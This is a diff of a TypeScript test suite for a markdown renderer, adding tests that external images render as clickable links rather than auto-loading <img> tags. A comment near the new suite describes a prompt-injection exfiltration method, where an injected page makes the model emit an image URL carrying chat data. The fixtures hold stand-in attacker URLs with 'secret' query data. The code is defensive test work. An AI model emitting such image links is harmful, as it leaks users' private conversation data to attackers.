@@ -64,10 +64,10 @@ describe('renderMarkdown preserves legitimate features', () => {
     expect(html).toContain('example</a>');
   });
 
-  it('renders markdown images as <img> tags', () => {
-    const html = renderMarkdown('![alt text](https://example.com/img.png)');
+  it('renders same-origin markdown images as <img> tags', () => {
+    const html = renderMarkdown('![alt text](/static/img.png)');
     expect(html).toContain('<img');
-    expect(html).toContain('src="https://example.com/img.png"');
+    expect(html).toContain('src="/static/img.png"');
     expect(html).toContain('alt="alt text"');
   });
 
@@ -232,5 +232,39 @@ describe('numeric table columns', () => {
     const html = renderMarkdown('| A | B |\n|:-:|---|\n| 1 | 2 |');
     expect(cells(html, 0).some((c) => c.classList.contains('num'))).toBe(false);
     expect(cells(html, 1).every((c) => c.classList.contains('num'))).toBe(true);
+  });
+});
+
+describe('external images never load by themselves', () => {
+  // A prompt-injected page can make the model emit ![](https://evil/?d=<chat data>):
+  // an <img> would send that request the moment the reply renders
+  const html = (md: string) => {
+    const div = document.createElement('div');
+    div.innerHTML = renderMarkdown(md);
+    return div;
+  };
+
+  it('turns an external image into a link the user can choose to open', () => {
+    const div = html('![chart](https://evil.example/x.png?d=secret)');
+    expect(div.querySelector('img')).toBeNull();
+    const link = div.querySelector('a');
+    expect(link?.getAttribute('href')).toBe('https://evil.example/x.png?d=secret');
+    expect(link?.getAttribute('rel')).toContain('noreferrer');
+    expect(link?.textContent).toContain('chart');
+  });
+
+  it('shows a raw HTML image as text, never as an image', () => {
+    const div = html('<img src="http://evil.example/p.gif" alt="">');
+    expect(div.querySelector('img')).toBeNull();
+  });
+
+  it('keeps inline data images', () => {
+    const div = html('![dot](data:image/png;base64,iVBORw0KGgo=)');
+    expect(div.querySelector('img')).not.toBeNull();
+  });
+
+  it('keeps same-origin images', () => {
+    const div = html('![file](/api/files/abc/thumbnail)');
+    expect(div.querySelector('img')?.getAttribute('src')).toBe('/api/files/abc/thumbnail');
   });
 });
